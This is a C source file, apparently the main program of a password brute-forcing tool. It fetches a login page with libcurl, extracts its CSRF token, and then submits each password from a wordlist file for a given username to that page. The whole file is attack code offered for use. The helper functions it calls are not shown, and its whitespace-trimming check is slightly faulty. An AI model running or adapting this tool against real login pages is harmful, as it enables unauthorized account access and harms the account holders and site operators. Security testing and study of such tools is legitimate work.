#include "headers.h"

int main(int argc, char **argv)
{
    if(verify_input(argc, argv) != 0)   return(1);
 
    const char *login_url = argv[2];
    char *username = argv[4];
    char *passfile = argv[6];

    CURL *curl;
    CURLcode res;
    long response_code;

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    if(!chunk.memory)
    {
        fprintf(stderr, "Failed to allocate initial memory. main.c\n");
        return(1);
    }
    chunk.size = 0;

    if(curl_global_init(CURL_GLOBAL_DEFAULT) != CURLE_OK)
    {
        fprintf(stderr, "failed to initialize CURL. main.c\n");
        free(chunk.memory);
        curl_global_cleanup();
        return(1);
    }

    curl = curl_easy_init();
    if(curl)
    {

        curl_easy_setopt(curl, CURLOPT_URL, login_url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, COOKIE_FILE);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
        {
            fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(res));
            free(chunk.memory);
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return(1);
        }

        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        printf("HTTP Response Code: %ld\n", response_code);

        char csrf_name[128];
        char csrf_value[256];
        if(extract_csrf_token(chunk.memory, csrf_name, sizeof(csrf_name), csrf_value, sizeof(csrf_value)) == 0)
        {
            printf("Found CSRF field: %s = %s\n", csrf_name, csrf_value);
        }
        else
        {
            fprintf(stderr, "Failed to extract CSRF token. main.c\n");
            free(chunk.memory);
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return(1);
        }
        free(chunk.memory);
        chunk.memory = NULL;
        
        FILE *fp = fopen(passfile, "r");
        if (!fp) 
        {
            printf("The file did not open main.c\n");
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return(1);
        }

        char pwd[71];
        //this where you add the statement for diff content type
        while(fgets(pwd, sizeof(pwd), fp))
        {
            size_t len = strlen(pwd);
            if((len > 0 && pwd[len - 1] == '\n') || (pwd[len - 1] == '\r') ||
                (pwd[len - 1] == ' ') || (pwd[len - 1] == '\t'))
            {
                pwd[len - 1] = '\0';
            }
            multipart_post(csrf_name, csrf_value, pwd, username, curl, login_url);
        }
        fclose(fp);
    }
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return(0);
}


int verify_input(int argc, char **argv)
{
    if(argc < 7)
    {
        printf("Usage: %s --url <login_page_url> -u <username> -P <path/to/passfile>\n", argv[0]);
        return(1);
    }
    if(strcmp(argv[1], "--url") != 0 || strcmp(argv[3], "-u") != 0 || strcmp(argv[5], "-P") != 0)
    {
        printf("Usage: %s --url <login_page_url> -u <username> -P <path/to/passfile>\n", argv[0]);
        return(1);
    }
    return(0);
}